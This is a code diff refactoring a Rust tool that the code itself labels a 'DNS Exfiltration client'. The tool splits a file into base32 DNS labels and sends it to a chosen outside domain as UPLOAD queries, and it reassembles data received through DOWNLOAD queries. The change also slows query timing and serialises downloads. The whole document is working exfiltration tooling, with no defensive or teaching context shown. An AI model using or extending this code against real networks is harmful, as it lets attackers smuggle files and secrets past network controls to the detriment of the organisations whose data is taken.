@@ -17,36 +17,26 @@ const MAX_ATTEMPTS: usize = 10;
 struct Args {
     #[command(subcommand)]
     command: Commands,
+}
 
-    /// Number of threads to use
-    #[arg(short, long, default_value_t = 4)]
-    threads: usize,
+#[derive(Parser, Debug)]
+struct CommonArgs {
+    #[arg(short, long)]
+    code: String,
+    
+    #[arg(short, long)]
+    filename: String,
+    
+    #[arg(short, long)]
+    domain: String,
 }
 
 #[derive(Subcommand, Debug)]
 enum Commands {
     /// Send data
-    Send {
-        #[arg(short, long)]
-        code: String,
-
-        #[arg(short, long)]
-        filename: String,
-
-        #[arg(short, long)]
-        domain: String,
-    },
+    Send(CommonArgs),
     /// Receive data
-    Receive {
-        #[arg(short, long)]
-        code: String,
-
-        #[arg(short, long)]
-        filename: String,
-
-        #[arg(short, long)]
-        domain: String,
-    },
+    Receive(CommonArgs),
 }
 
 #[tokio::main]
@@ -55,13 +45,13 @@ async fn main() {
     let args = Args::parse();
     let resolver = get_resolver();
 
-    info!("Starting DNS Exfiltration client with {} threads", args.threads);
+    info!("Starting DNS Exfiltration client");
 
     match args.command {
-        Commands::Send { code, filename, domain } => {
-            match fs::read(&filename) {
+        Commands::Send(common_args) => {
+            match fs::read(&common_args.filename) {
             Ok(raw_bytes) => {
-                info!("File {} exists and is readable", &filename);
+                info!("File {} exists and is readable", &common_args.filename);
                 let labels = split_data_into_label_chunks(&raw_bytes);
                 let encoded_labels = encode_base32(labels);
                 let total_labels = encoded_labels.len();
@@ -69,12 +59,12 @@ async fn main() {
                 let start_time = Instant::now();
                 let futures: Vec<_> = encoded_labels.iter().enumerate().map(|(i, label)| {
                 let resolver = resolver.clone();
-                let code = code.clone();
-                let domain = domain.clone();
+                let code = common_args.code.clone();
+                let domain = common_args.domain.clone();
                 async move {
                     let mut attempts = 0;
                     loop {
-                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
+                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                     let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
             
                     match resolver.lookup(&query, get_random_record_type()).await {
@@ -105,16 +95,16 @@ async fn main() {
             }
             };
         }
-        Commands::Receive { code, filename, domain } => {
-            match fs::OpenOptions::new().write(true).create(true).truncate(false).open(&filename) {
-                Ok(_) => info!("File {} is writable", &filename),
+        Commands::Receive(common_args) => {
+            match fs::OpenOptions::new().write(true).create(true).truncate(false).open(&common_args.filename) {
+                Ok(_) => info!("File {} is writable", &common_args.filename),
                 Err(e) => {
                     error!("Error opening file for writing: {}", e);
                     return;
                 }
             };
 
-            let query = format!("DOWNLOAD.{}.{}", code, domain);
+            let query = format!("DOWNLOAD.{}.{}", common_args.code, common_args.domain);
             let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;
 
             let total_fragments: usize = match response {
@@ -135,48 +125,50 @@ async fn main() {
             info!("Total fragments to download: {}", total_fragments);
 
             let start_time = Instant::now();
-            let futures: Vec<_> = (0..total_fragments).map(|seq| {
-                let resolver = resolver.clone();
-                let code = code.clone();
-                let domain = domain.clone();
-                async move {
-                    let mut attempts = 0;
-                    let mut data = None;
-                    while attempts < MAX_ATTEMPTS {
-                        let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
-                        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
+            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
+            for (seq, data) in received_data.iter_mut().enumerate().take(total_fragments) {
+                let mut attempts = 0;
+                while attempts < MAX_ATTEMPTS {
+                    let query = format!("DOWNLOAD.{}.{}.{}", common_args.code, seq, common_args.domain);
+                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
 
-                        match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
-                            Ok(lookup) => {
-                                let records = lookup.iter().collect::<Vec<_>>();
-                                let record_data = records[0].to_string();
-                                data = Some(record_data);
-                                break;
-                            }
-                            Err(_) => {
-                                attempts += 1;
-                            }
+                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
+                        Ok(lookup) => {
+                            let records = lookup.iter().collect::<Vec<_>>();
+                            let record_data = records[0].to_string();
+                            *data = Some(record_data);
+                            break;
+                        }
+                        Err(_) => {
+                            attempts += 1;
                         }
                     }
-
-                    if attempts >= MAX_ATTEMPTS {
-                        error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
-                        error!("Aborting...");
-                        std::process::exit(1);
-                    }
-
-                    data
                 }
-            }).collect();
 
-            let received_data: Vec<_> = join_all(futures).await.into_iter().flatten().collect();
+                if attempts >= MAX_ATTEMPTS {
+                    error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
+                    error!("Aborting...");
+                    std::process::exit(1);
+                }
+
+                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
+                let elapsed = start_time.elapsed().as_secs_f32();
+                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
+                let remaining = estimated_total - elapsed;
+                info!(
+                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
+                    progress, elapsed, remaining
+                );
+            }
 
             let elapsed = start_time.elapsed().as_secs_f32();
             let byte_rate = (total_fragments as f32 * 32.0) / elapsed; // Assuming each fragment is 32 bytes
-            let decoded_data = decode_base32(received_data);
+            let decoded_data = decode_base32(
+                received_data.into_iter().flatten().collect(),
+            );
             let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
-            fs::write(&filename, flattened_data).expect("Failed to write data to file");
-            info!("Data successfully written to file: {}", filename);
+            fs::write(&common_args.filename, flattened_data).expect("Failed to write data to file");
+            info!("Data successfully written to file: {}", common_args.filename);
             info!("Average byte rate: {:.1} bytes/s", byte_rate);
         }
     }
